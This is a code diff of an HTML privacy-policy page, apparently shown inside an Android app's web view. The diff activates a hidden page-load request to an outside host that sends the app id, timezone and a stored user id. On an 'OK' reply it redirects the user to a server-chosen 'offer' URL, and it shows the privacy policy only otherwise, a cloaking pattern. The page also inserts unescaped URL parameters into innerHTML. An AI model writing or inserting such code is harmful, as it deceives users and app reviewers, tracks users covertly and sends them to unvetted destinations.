@@ -53,53 +53,54 @@
       window.addEventListener("load", (event) => {
         const p = new URLSearchParams(window.location.search);
 
-        // const url = new URL("http://cloaca-tz.space/go.php");
+        const url = new URL("https://cloaca-tz.space/go.php");
 
-        // url.searchParams.append("id", p.get("appid"));
-        // url.searchParams.append(
-        //   "timezone",
-        //   new Date().getTimezoneOffset() * 60 * -1
-        // );
+        url.searchParams.append("id", p.get("appid"));
+        url.searchParams.append(
+          "timezone",
+          new Date().getTimezoneOffset() * 60 * -1
+        );
 
-        // if (localStorage.getItem("userId")) {
-        //   url.searchParams.append("userId", localStorage.getItem("userId"));
-        // }
+        if (localStorage.getItem("userId")) {
+          url.searchParams.append("userId", localStorage.getItem("userId"));
+        }
 
-        // var xhttp = new XMLHttpRequest();
-        // xhttp.open("GET", url.toString(), true);
-        // xhttp.onreadystatechange = function () {
-        //   if (this.readyState == 4 && this.status == 200) {
-        //     var response = this.responseText;
+        var xhttp = new XMLHttpRequest();
+        xhttp.open("GET", url.toString(), true);
+        xhttp.onreadystatechange = function () {
+          if (this.readyState == 4 && this.status == 200) {
+            var response = JSON.parse(this.responseText);
 
-        //     console.log(response);
-        //   }
-        // };
-        // xhttp.send();
+            if (response.status == "OK") {
+              localStorage.setItem("userId", response.id.toString());
+              location.href = response.offer;
+            } else {
 
-        // return;
+              let formatted = policy
+                .split("DEV_ORG")
+                .join(p.get("org"))
+                .split("APP_NAME")
+                .join(p.get("app"))
+                .split("DEV_NAME")
+                .join(p.get("dev"))
+                .split("DATE")
+                .join(p.get("date"))
+                .split("EMAIL")
+                .join(p.get("email"));
 
-        // document.getElementById("accept").onclick = function () {
-        //   console.log("accepted");
-        //   Android.accepted();
-        // };
+              document.getElementById("privacy").innerHTML = formatted;
+              document.getElementById("loading").style.display = "none";
 
-        let formatted = policy
-          .split("DEV_ORG")
-          .join(p.get("org"))
-          .split("APP_NAME")
-          .join(p.get("app"))
-          .split("DEV_NAME")
-          .join(p.get("dev"))
-          .split("DATE")
-          .join(p.get("date"))
-          .split("EMAIL")
-          .join(p.get("email"));
+              document.getElementById("accept").onclick = function () {
+                console.log("accepted");
+                Android.accepted();
+              };
+            }
+          }
+        };
+        xhttp.send();
 
-        document.getElementById("privacy").innerHTML = formatted;
-
-        setTimeout(function () {
-          document.getElementById("loading").style.display = "none";
-        }, 100);
+        return;
       });
     </script>
   </body>
